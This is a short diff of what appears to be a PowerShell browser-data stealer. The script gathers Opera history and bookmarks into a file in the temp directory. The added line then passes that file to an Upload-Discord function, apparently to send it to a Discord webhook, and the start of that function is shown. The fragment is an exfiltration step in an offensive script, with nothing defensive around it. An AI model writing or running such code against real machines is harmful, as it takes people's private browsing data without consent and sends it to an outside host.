@@ -46,6 +46,8 @@ Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.t
 
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
 
+Upload-Discord -file $env:TMP\--BrowserData.txt
+
 #------------------------------------------------------------------------------------------------------------------------------------
 
 function Upload-Discord {
